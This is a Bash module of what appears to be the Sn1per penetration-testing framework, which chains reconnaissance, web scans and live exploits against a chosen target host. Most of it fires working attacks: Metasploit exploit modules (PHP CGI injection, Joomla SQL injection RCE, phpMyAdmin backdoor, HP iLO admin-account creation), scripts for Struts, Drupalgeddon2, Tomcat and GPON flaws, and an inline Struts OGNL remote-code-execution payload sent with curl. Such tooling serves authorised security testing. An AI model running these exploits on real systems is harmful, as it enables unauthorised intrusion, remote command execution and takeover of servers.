# WEBPORTHTTP MODE #####################################################################################################
if [ "$MODE" = "webporthttp" ]; then
  if [ "$REPORT" = "1" ]; then
    if [ ! -z "$WORKSPACE" ]; then
      args="$args -w $WORKSPACE"
      LOOT_DIR=$INSTALL_DIR/loot/workspace/$WORKSPACE
      echo -e "$OKBLUE[*] Saving loot to $LOOT_DIR [$RESET${OKGREEN}OK${RESET}$OKBLUE]$RESET"
      mkdir -p $LOOT_DIR 2> /dev/null
      mkdir $LOOT_DIR/domains 2> /dev/null
      mkdir $LOOT_DIR/screenshots 2> /dev/null
      mkdir $LOOT_DIR/nmap 2> /dev/null
      mkdir $LOOT_DIR/notes 2> /dev/null
      mkdir $LOOT_DIR/reports 2> /dev/null
      mkdir $LOOT_DIR/scans 2> /dev/null
      mkdir $LOOT_DIR/output 2> /dev/null
    fi
    echo "sniper -t $TARGET -m $MODE -p $PORT --noreport $args" >> $LOOT_DIR/scans/$TARGET-$MODE-$PORT-`date +%Y%m%d%H%M`.txt
    sniper -t $TARGET -m $MODE -p $PORT --noreport $args | tee $LOOT_DIR/output/sniper-$MODE-$PORT-`date +%Y%m%d%H%M`.txt 2>&1
    exit
  fi
  echo -e "$OKRED                ____               $RESET"
  echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
  echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
  echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
  echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
  echo -e "$OKRED               /_/                 $RESET"
  echo -e "$RESET"
  echo -e "$OKORANGE + -- --=[https://xerosecurity.com"
  echo -e "$OKORANGE + -- --=[sniper v$VER by 1N3"
  echo -e ""
  echo -e ""
  echo -e "               ;               ,           "
  echo -e "             ,;                 '.         "
  echo -e "            ;:                   :;        "
  echo -e "           ::                     ::       "
  echo -e "           ::                     ::       "
  echo -e "           ':                     :        "
  echo -e "            :.                    :        "
  echo -e "         ;' ::                   ::  '     "
  echo -e "        .'  ';                   ;'  '.    "
  echo -e "       ::    :;                 ;:    ::   "
  echo -e "       ;      :;.             ,;:     ::   "
  echo -e "       :;      :;:           ,;\"      ::   "
  echo -e "       ::.      ':;  ..,.;  ;:'     ,.;:   "
  echo -e "        \"'\"...   '::,::::: ;:   .;.;\"\"'    "
  echo -e "            '\"\"\"....;:::::;,;.;\"\"\"         "
  echo -e "        .:::.....'\"':::::::'\",...;::::;.   "
  echo -e "       ;:' '\"\"'\"\";.,;:::::;.'\"\"\"\"\"\"  ':;   "
  echo -e "      ::'         ;::;:::;::..         :;  "
  echo -e "     ::         ,;:::::::::::;:..       :: "
  echo -e "     ;'     ,;;:;::::::::::::::;\";..    ':."
  echo -e "    ::     ;:\"  ::::::\"\"\"'::::::  \":     ::"
  echo -e "     :.    ::   ::::::;  :::::::   :     ; "
  echo -e "      ;    ::   :::::::  :::::::   :    ;  "
  echo -e "       '   ::   ::::::....:::::'  ,:   '   "
  echo -e "        '  ::    :::::::::::::\"   ::       "
  echo -e "           ::     ':::::::::\"'    ::       "
  echo -e "           ':       \"\"\"\"\"\"\"'      ::       "
  echo -e "            ::                   ;:        "
  echo -e "            ':;                 ;:\"        "
  echo -e "    -hrr-     ';              ,;'          "
  echo -e "                \"'           '\"            "
  echo -e "                  ''''$RESET"
  echo ""
  echo "$TARGET" >> $LOOT_DIR/domains/targets.txt
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING TCP PORT SCAN $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  nmap -sV -Pn -p $PORT --open $TARGET -oX $LOOT_DIR/nmap/nmap-http-$TARGET.xml
  port_http=`grep 'portid="'$PORT'"' $LOOT_DIR/nmap/nmap-http-$TARGET.xml | grep open`
  if [ -z "$port_http" ]; then
    echo -e "$OKRED + -- --=[Port $PORT closed... skipping.$RESET"
  else
    echo -e "$OKORANGE + -- --=[Port $PORT opened... running tests...$RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED CHECKING FOR WAF $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    wafw00f http://$TARGET:$PORT | tee $LOOT_DIR/web/waf-$TARGET-http-$PORT 2> /dev/null
    echo ""
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED GATHERING HTTP INFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    whatweb -a 3 http://$TARGET:$PORT | tee $LOOT_DIR/web/whatweb-$TARGET-http-$PORT 2> /dev/null
    echo ""
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED GATHERING SERVER INFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python3 $PLUGINS_DIR/wig/wig.py -d -q -t 50 http://$TARGET | tee $LOOT_DIR/web/wig-$TARGET-http
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/wig-$TARGET-http > $LOOT_DIR/web/wig-$TARGET-http.txt 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED CHECKING HTTP HEADERS AND METHODS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    wget -qO- -T 1 --connect-timeout=3 --read-timeout=3 --tries=1 http://$TARGET |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-http-$TARGET.txt 2> /dev/null
    curl --connect-timeout 3 -I -s -R http://$TARGET | tee $LOOT_DIR/web/headers-http-$TARGET.txt 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED SAVING SCREENSHOTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port$PORT.jpg"
    if [ ${DISTRO} == "blackarch"  ]; then
      /bin/CutyCapt --url=http://$TARGET:$PORT --out=$LOOT_DIR/screenshots/$TARGET-port$PORT.jpg --insecure --max-wait=1000 2> /dev/null
    else
      cutycapt --url=http://$TARGET:$PORT --out=$LOOT_DIR/screenshots/$TARGET-port$PORT.jpg --insecure --max-wait=1000 2> /dev/null
    fi
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -Pn -T5 -p $PORT -sV --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-vuln* $TARGET
    if [ "$PASSIVE_SPIDER" == "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING PASSIVE WEB SPIDER $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      curl -sX GET "http://index.commoncrawl.org/CC-MAIN-2018-22-index?url=*.$TARGET&output=json" | jq -r .url | sort -u | tee $LOOT_DIR/web/spider-$TARGET.txt 2> /dev/null
    fi

    if [ "$BLACKWIDOW" == "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING ACTIVE WEB SPIDER & APPLICATION SCAN $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      blackwidow -u http://$TARGET -l 3 -s y 2> /dev/null
      cat /usr/share/blackwidow/$TARGET/$TARGET-urls-sorted.txt >> $LOOT_DIR/web/spider-$TARGET.txt 2>/dev/null
    fi

    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING FILE/DIRECTORY BRUTE FORCE $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python3 $PLUGINS_DIR/dirsearch/dirsearch.py -u http://$TARGET:$PORT -w $WEB_BRUTE_INSANE -x 400,403,404,405,406,429,502,503,504 -F -e php,asp,aspx,bak,zip,tar.gz,html,htm 
    cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* 2> /dev/null
    cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* > $LOOT_DIR/web/dirsearch-$TARGET.txt 2> /dev/null
    wget http://$TARGET:$PORT/robots.txt -O $LOOT_DIR/web/robots-$TARGET:$PORT-http.txt 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    clusterd -i $TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    wpscan --url http://$TARGET:$PORT --batch --disable-tls-checks
    echo ""
    wpscan --url http://$TARGET:$PORT/wordpress/ --batch --disable-tls-checks
    echo ""
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING CMSMAP $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $CMSMAP -t http://$TARGET:$PORT
    echo ""
    python $CMSMAP -t http://$TARGET/wordpress/
    echo ""
    if [ "$NIKTO" == "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING WEB VULNERABILITY SCAN $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      nikto -h http://$TARGET:$PORT -output $LOOT_DIR/web/nikto-$TARGET-http-$PORT.txt
    fi
    cd $INSTALL_DIR
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    clusterd -i $TARGET -p $PORT
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; run; use scanner/http/webdav_website_content; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL false; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS \"$TARGET\"; set RPORT 80; set WAIT 2; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use exploit/windows/http/badblue_passthru; setg RHOST \"$TARGET\"; set RPORT 80; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST \"$TARGET\"; set RPORT 80; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST \"$TARGET\"; set RPORT 80; set SSL false; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT "$PORT"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING SHELLSHOCK EXPLOIT SCAN $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port $PORT
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2017-5638 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/apache_struts_cve-2017-5638.py -u http://$TARGET:$PORT
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2017-9805 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/apache_struts_cve-2017-9805.py -u http://$TARGET:$PORT
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE JAKARTA RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://$TARGET:$PORT | head -n 1
    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2018-11776 RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/apache-struts-CVE-2018-11776.py -u http://$TARGET:$PORT
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING DRUPALGEDDON2 CVE-2018-7600 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    ruby $INSTALL_DIR/bin/drupalgeddon2.rb http://$TARGET:$PORT 
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING CISCO ASA TRAVERSAL CVE-2018-0296 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/cisco-asa-traversal.py http://$TARGET:$PORT
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING JEXBOSS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    cd /tmp/
    python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET:$PORT 
    cd $INSTALL_DIR
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING GPON ROUTER EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/gpon_rce.py http://$TARGET:$PORT 'whoami'
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE TOMCAT CVE-2017-12617 RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/tomcat-cve-2017-12617.py -u http://$TARGET:$PORT

    if [ $SCAN_TYPE == "DOMAIN" ]; then
      if [ $OSINT == "0" ]; then
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED SKIPPING GOOGLE HACKING QUERIES $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
      else
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING GOOGLE HACKING QUERIES $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        goohak $TARGET > /dev/null
      fi
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING INURLBR OSINT QUERIES $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt
      rm -Rf output/ cookie.txt exploits.conf
      GHDB="1"
    fi
  fi
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED SCAN COMPLETE! $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  rm -f $INSTALL_DIR/.fuse_* 2> /dev/null
  if [ "$LOOT" = "1" ]; then
    loot
  fi
  exit
fi